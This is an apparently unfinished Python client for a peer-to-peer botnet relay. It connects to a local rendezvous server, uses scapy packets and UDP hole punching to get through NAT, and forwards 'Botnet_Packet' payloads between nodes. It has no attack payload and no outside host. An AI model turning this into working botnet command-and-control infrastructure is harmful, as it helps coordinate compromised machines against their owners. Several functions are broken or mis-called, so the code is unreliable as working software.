import socket
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.http import Raw
from Utils import *
from Botnet_Protocol import Botnet_Packet
import threading
from Botnet_Protocol import Botnet_Packet
from queue import Queue
import time

SERVER_IP = "::1"
SERVER_PORT = 21212
DEST_MAC = "107B444CE6B2"
send_threads = Queue(MAX_SEND_THREADS_COUNT)


def main():         # for testing only
   pass 
   
       
def com_loop():                                 # TODO: add check for botnet ttl
    MAC = input("input MAC address: ")
    dport = int(input("input dport: "))
    send_msg = bool(int(input("send msg to next node? ")))
    server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    server.connect((SERVER_IP, dport))
    logging.info(f"connected to {server.getpeername()}, from {server.getsockname()}")
    succeeded = TCP_send(server, MAC)
    if succeeded is None: pass                                                                              # TODO: handle errors
    if send_msg:                                                                                            # for testing
        packet = Botnet_Packet(dest_IP="127.0.0.1", dest_port=int(input("input dport: ")), src_port=server.getsockname()[1], payload_packet=IP()/TCP()/Raw(), end_IP="127.0.0.1", end_port=1234) 
        send_thread = threading.Thread(target=send_to_node, args=((SERVER_IP, dport), packet, MAC, input("input MAC: ")))
        send_thread.start()                                                                                # TODO: should be different server than currently connected to
        send_threads.put(send_thread)
    while True:
        address = server_listener(server, MAC)
        if address is not tuple:
            continue                                                                                        # TODO: handle different server error conditions.
        payload = receive_from_node(address)
        if not send_threads.not_full():
            logging.debug(f"too many sending threads {send_threads}")
            pass                                                                                            # TODO: implement a way to deal with too many threads
        packet = Botnet_Packet(dest_IP="127.0.0.1", dest_port=dport, src_port=server.getsockname()[1], payload=payload) 
        send_thread = threading.Thread(target=send_to_node, args=((SERVER_IP, dport), packet, MAC, input("input Mac of next node: ")))
        send_thread.start()                                                                                 # TODO: should be different server than currently connected to
        send_threads.put(send_thread)


def send_to_node(address: tuple, packet: Botnet_Packet, src_MAC="000000000000", dst_MAC="000000000000"):  # TODO: deal with errors
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as server:
        server.connect(address)
        succeeded = TCP_send(server, src_MAC)
        logging.info(f"connected to server {server.getpeername()}")
        time.sleep(1)
        print(1)
        addr = contact_IPv6server(server, dst_MAC)
        print(2)
        if addr is int:
            match addr:                 # TODO: handle searching for target
                case 0:
                    return
                case 1:
                    return
                case _:
                    return
        src_port = server.getsockname()[1]
        packet = IP(dst=addr[0])/UDP(sport=src_port, dport=addr[1])/Raw(b'hello there')
        succeeded = holepunch(packet)
        if succeeded is None:           # Here it shouldn't return, the thread would continue trying to reach the destination until the main thread terminates it               
            return
        packet.set_sport(server.getsockname()[1])
        packet.send_pac()


def contact_IPv6server(server: socket.socket, MAC="000000000000"):
    print(3)
    succeeded = TCP_send(server, MAC)
    print(4)
    if succeeded is None: return
    response = TCP_recieve(server)
    print(type(response))
    if response is int:
        return response
    logging.debug(f"received {response} from {server.getpeername()} on {server.getsockname()}")
    dest_IP, dest_port = response.split('$')  # TODO: check for incorrect response
    dest_port = int(dest_port)
    return (dest_IP, dest_port)


def server_listener(server: socket.socket, MAC="000000000000"):
    msg = TCP_recieve(server)
    if msg != 0:
        dest_IP, dest_port = msg.split('$')  # TODO: check for incorrect message
        dest_port = int(dest_port)
        return (dest_IP, dest_port)
    Succeeded = TCP_send(server, 'hello there')
    if Succeeded is None: return 1          # TODO: switch to another server or close thread
    return 0


def receive_from_node(address: tuple, dst_IP: str, dst_port: int, src_port: int):
    packet = IP(dst=dst_IP)/UDP(sport=src_port, dport=dst_port)/Raw(b'hello there')
    succeeded = holepunch(packet, address)
    if succeeded is None:
        return
    payload = receive_botnet_packet                   # TODO: handle errors
    logging.debug(f"received payload {payload} from {address}")
    return payload


if __name__ == "__main__":
    com_loop()
